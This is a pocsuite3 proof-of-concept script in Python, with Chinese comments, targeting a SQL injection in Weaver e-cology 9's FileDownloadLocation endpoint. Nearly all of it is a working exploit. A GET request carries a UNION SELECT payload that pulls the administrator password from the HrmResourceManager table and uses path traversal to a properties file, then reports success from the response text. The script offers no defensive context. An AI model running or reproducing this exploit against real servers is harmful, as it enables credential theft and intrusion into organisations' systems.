# -*- coding: utf-8 -*-
# @Time : 2025/2/20 21:51
# @Author : 为赋新词强说愁
# -*- coding: utf-8 -*-
# @Time : 2025/2/20 21:16
# @Author : 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class FileDownLoadcation(POCBase):
    pocDesc = ''' 泛微e-cology 9 FileDownLoadcation SQL注入漏洞'''
    vulID = '0'
    version = '1.0'
    author = 'Solder'
    vulDate = '2025-2-21'
    createDate = '2025-2-21'
    updateDate = '2025-2-21'
    name = '泛微e-cology 9 FileDownLoadcation SQL注入漏洞'
    appName = '泛微e-cology'



    def _verify(self):

        result = {}
        path = "/weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,'../ecology/WEB-INF/prop/mobilemode.properties'+as+x2,'3'+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0 " # 参数
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        url = self.url + path
        payload = url
        try:
            response = requests.get(url, headers=headers, timeout=5)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'wx.enabled' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Name'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(FileDownLoadcation)